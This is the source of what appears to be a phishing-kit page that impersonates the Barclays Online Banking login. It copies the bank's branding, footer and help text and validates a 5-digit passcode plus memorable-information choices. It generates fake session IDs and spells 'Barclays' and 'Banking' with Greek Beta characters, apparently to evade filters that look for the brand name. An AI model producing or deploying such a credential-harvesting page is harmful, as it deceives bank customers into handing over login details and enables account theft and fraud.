<?php
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
?>
<!DOCTYPE html>
<html lang="en-GB">
<head>
<link href="assets/img/fav.ico" rel="shortcut icon" type="image/x-icon">
<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="Content-Language" content="en-GB" />
<title>Login</title>
<link href="assets/css/login.css" rel="stylesheet" type="text/css" media="screen" />
<script>
function FocusOnInput(){
    document.getElementById("passcode").focus();
}
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="assets/js/jquery.payment.js"></script>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<style>
.error {
    color: #9a040d;
    padding-bottom: 5px;
}
input.error, select.error {
    background-color: #f5e6eb;
    border-color: #9d063b;
    color: #9d063b;
	border: 1px solid #9d063b!important;
}
#pin-authorise3-error {
	padding-left:120px;
}
#ErrorPasscode-error {
	padding-left:234px;
}
</style>
<script>
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#form").validate({
				errorElement: "span",			
                rules: {
					passcode: { required: true, minlength: 5, digits: true,},
					one: { required: true,},
					two: { required: true,},
                },
				groups: {
					ErrorPasscode: "one two",
				},
				errorPlacement: function(error, element) {
				if (element.attr("name") == "one" || element.attr("name") == "two")
				error.insertAfter("#ErrorMemo");
				else 
				error.insertAfter(element);
				if (element.attr("name") == "passcode")
				error.insertAfter("#ErrorPasscode");
				},
                messages: {
					passcode: {
						required: "You must enter your passcode",
						minlength: jQuery.validator.format("Passcode must contain exactly 5 characters"),
						digits: jQuery.validator.format("Your passcode must contain only numeric characters"),
					},
					one: {
						required: "Please select one of the available options",
					},		
					two: {
						required: "Please select one of the available options",
					},					
				},
				errorClass: "error",
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
  </script>
</head>
<body onload="FocusOnInput()">
<a id="#top"></a>
<div id="skip-links">
<p class="skip-link-p">Skip to: 
<a accesskey="1" class="skip-link" href="#content">content</a>, 
<a accesskey="2" class="skip-link" href="#nav-links">navigation</a>
</p>
</div>
<div id="container">
<header>
<div id="masthead">
<div id="access-links">
<ul class="access-link-list">
<li class="first"><a href="mobile/Login.php?&sessionid=<?php echo generateRandomString(90); ?>&securessl=true">Mobile site</a></li>
<li><a href="#" target="_blank">Contact us</a>
<li><a href="#" target="_blank">Security</a>
<li><a href="#" target="_blank">Accessibility</a></li>
</ul>
<a name="infoend"></a>
</div>
<p class="logo"><a id="logo" href="#" title="logo" class="default"></a><img class="pronly" src="assets/img/logo.png" width="265" height="45" /></p>
<nav>
<div>
<div id="login">
<h1><strong>Quick, safe and convenient</strong> - Online Banking made easy</h1>
<p>Not yet registered for Online &Beta;anking? <a id="registerNowLink" href="#">Register now</a>.</p>
</div>
</div>
</nav>
</div>
</header>
<article>
<div id="content" class="clearfix">
<div>
<div class="login-ctr ftb" >
<div id="tipBody">
<div class="logon-snippet-ftb" id="logon-snippet-icookie">
<div class="info">
<div class="icon icon-exclamation-snippet"></div>
<p><strong>Updated cookies policy</strong></p><p>We&nbsp;use cookies on this website.</p><p>They help us to know a little bit about you and how you use our website, which improves the browsing experience and marketing &ndash; both for you and for others.</p><p>They are stored locally on your computer or mobile device. To accept cookies, continue to log in.</p><p>Or go to the <a id="iCookiePolicy" href="#">cookies policy</a> for more information and preferences.</p>
</div>
</div>
</div>
<div id="page">
<?php include 'assets/includes/topaccordion.php';?>
<?php include 'assets/includes/bottomaccordion.php';?>
<div id="_sc22" class="hide {'selector':'#accordion-bottom','s.prop24':'Step2AccordionClickOnDisable','bind':'click','s.__LinkName':'onl:LoginStepTwoConfirmYourID:logon:Login:Step2AccordionClickOnDisable'}"></div>
</div>
</div>
<div class="right-info ftb">
<div class="help-centre">
<ul class="help-centre ">
<li><h2>Help and support</h2></li>
<li>
<ul class="help-centre-body">
<li style="display: none; top: -2px; left: -203px;" id="help-centre-dialog">
<ul>
<li>
<h3>How do I login with a PINsentry card reader?</h3>
<span id="help-centre-close-icon">&nbsp;</span>
</li>
<li style="display: block;" data-loaded-help-card-ref="PINsentry_Login_Help">
<span class="title hide">How do I login with a PINsentry card reader?</span>
<ul class="help-content-drawer">    
<li>    
<div>    
<ol>        
<li>Enter the last 4 numbers of your debit, cash or authentication card into the log-in page</li>    
</ol>    
</div>    
<div>  
<img src="assets/img/pin_step_1.jpg" alt="" height="115" width="190">
</div>    
</li>    
<li>    
<div>    
<ol start="2">        
<li>Insert your card into the reader, face up, chip end first, then press <strong>IDENTIFY</strong></li>        
<li>Type your PIN and press <strong>ENTER</strong></li>    
</ol>    
</div>    
<div><img src="assets/img/pin_step_2.jpg" alt="" height="253" width="190"></div>   
</li>    
<li>    
<div>    
<ol start="4">        
<li>An 8-digit code will appear on the card reader. Enter this code into the log-in page on your computer</li>    
</ol>    
</div>    
<div>  
<img src="assets/img/pin_step_3.jpg" alt="" height="142" width="190"></div>    
</li>
</ul>
</li>
<li style="display: none;" data-loaded-help-card-ref="Error_Code_6_help_card">
<span class="title hide">What does error code 6 mean?</span>
<ul class="help-content-drawer">    
<li>    
<p align="left">If you're having problems logging in to Online Banking, you may need to clear your internet browser's cache or update the browser.</p>    
<p align="left">Below is a guide to clearing the cache for the most common browsers. You can also find the information in your browser's 'help' section.</p>    
<br>    
<h4 align="left"><strong>PC users:</strong></h4>    
<p align="left"><strong>Internet Explorer (IE)</strong> &ndash; press <strong>Ctrl, Shift</strong> and <strong>Delete</strong> together, then select 'temporary internet files' and click 'delete'</p>    
<p align="left"><strong>Chrome</strong> &ndash; press <strong>Ctrl, Shift</strong> and <strong>Delete</strong> together. In the 'clear browsing data window', select 'cached images and files' only, then click 'clear browsing data'</p>    
<p align="left"><strong>Firefox</strong> &ndash; press <strong>Ctrl, Shift</strong> and <strong>Delete</strong> together, then select 'clear recent history', select 'cache' only within 'details', then click 'clear now'</p>    <p align="left"><strong>Safari</strong> &ndash; press <strong>Ctrl, Alt</strong> and the letter <strong>E</strong> together, then select 'empty'</p>    
<br>    
<h4 align="left"><strong>Mac users:</strong></h4>    <p align="left"><strong>Chrome &ndash; Cmd, Shift</strong> and the letter <strong>R</strong> together</p>    
<p align="left"><strong>Firefox &ndash; Cmd, Shift</strong> and the letter <strong>R</strong> together</p>    
<p align="left"><strong>Safari &ndash; Cmd, Alt</strong> button and the letter <strong>E</strong> together</p>    
<p align="left">To update your browser, please check your browser's help section.</p>    
</li>
</ul>
</li>
<li style="display: none;" data-loaded-help-card-ref="Remember_Me_Help">
<span class="title hide">Is saving my details safe?</span>
<ul class="help-content-drawer">
<li><p>If you tick the 'remember me' box, your details will only be retained on the device you're using at the time. That's why we don't recommend you do so on any public or shared devices. This means you don't need to worry about anyone else seeing the details. Even if they do, there isn't enough information there for anyone to access your accounts in Online Banking or any other way.</p>    <p>If you want to save your details, you need to make sure you've switched cookies on for your browser &ndash; that's how the information is stored.</p>    </li>
</ul>
</li>
<li>
<a href="#" id="HelpCardClose" value="Close" class="button blue" onclick="scSetHelpCardButtons('Close');">Close</a>
<div class="checkbox">
<input autocomplete="off" name="DontShow" id="DontShow" type="checkbox">
<label style="display: none;" for="DontShow">Don't show me this again</label>
</div>
</li>
</ul>
</li>
<li>
<div class="help-card-link" data-help-card-ref="PINsentry_Login_Help" data-display="CLOSE" id="PINsentry_Login_Help">How do I login with a PINsentry card reader?</div>
</li>          
<li>
<div class="help-card-link" data-help-card-ref="Error_Code_6_help_card" data-display="CLOSE" id="Error_Code_6_help_card">What does error code 6 mean?</div>
</li>
<li>
<div class="help-card-link" data-help-card-ref="Remember_Me_Help" data-display="CLOSE" id="Remember_Me_Help">Is saving my details safe?</div>
</li>
</ul>
</li>
<li>
<button data-ref="Need_More_Help" id="channel-info-button" onclick="scSetHelpCardButtons('NeedMoreHelp');" class="button blue " type="submit">Need more help?</button>
</li>        
</ul>
</div>
<div class="channel-info-container">
<div id="channel-info">
<b id="channel-info-arrow"></b>
<div id="channel-info-popup">
<div id="channel-info-close" class="sprite close-cross"></div>
<div id="channel-info-content"><ul>    <li class="help-sprite help-phone-icon">0345 6002323</li></ul></div>
</div>
</div>
</div>
<div class="right-info-snippet">
<div class="module-holder">
<div class="module-header">
<h2></h2>
</div>
<div class="module-content">
<div id="fscs-banner-snippet" class="snippet">
<div target="_blank"<p> <img src="assets/img/FSCS.jpg" height="46" width="228"></p></div>
</div>
</div>
<div class="module-footer">
<span></span>
</div>
</div>
</div>
</div>
</div>
</div>
</article>
<footer>
 
<div id="footer">
<div class="footnote">
    <p>
       &Beta;arclays &Beta;ank PLC. Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential
       Regulation Authority (Financial Services Register no: 122702). &Beta;arclays &Beta;ank PLC subscribes to the Lending Code which is monitored and
       enforced by the Lending Standards &Beta;oard. Further details can be found at
       <a title="Lending Standards Board (opens in a new browser window)" target="_blank" href="#"> www.lendingstandardsboard.org.uk</a>. Barclays Insurance Services Company Limited is authorised and regulated by the Financial Conduct Authority (Financial Services Register no: 312078).
    </p>
    <p>
       Barclays Bank PLC. Registered in England. Registered no. 1026167. Barclays Insurance Services Company Limited. Registered in England. Registered no. 973765. Registered office for both: 1 Churchill Place, London E14 5HP. 'The Woolwich' and 'Woolwich' are trademarks and trading names of Barclays Bank PLC. Barclays Business is a trading name of Barclays Bank PLC.
    </p>
    <br/>
    <p >
<img class="pronly" src="assets/img/premier.jpg"/>
<a href="#" target="_blank" class="premier-league">
<span class="premier-league">Proud sponsors of the Barclays Premier League</span>
</a>
</p>
</div>
</div>
</footer>
</div>
</body>
</html>
